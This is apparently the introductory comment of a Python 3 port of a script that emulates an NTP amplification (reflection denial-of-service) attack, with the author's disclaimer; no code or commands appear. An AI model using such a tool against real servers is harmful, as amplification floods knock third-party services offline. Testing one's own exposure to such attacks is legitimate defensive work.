This script was taken from Ron Nilekani and modified for Python3, I found
it to be quite useful to verify on an NTP Amplified Attack but I found it
a bit cumbersome to use, the modifications are only intended for ease of
use and updating it to Python3, nothing more.

Disclaimer - This program emulates the behavior of NTP Amplification attack.
It is not necessarily the best solution coz I am not a developer by profession.
In other words, I generally use libraries or data structures that I am 
comfortable or familiar with. If you think there is an optimal method to do
this, then please share your ideas. I am always open to learning something
new.
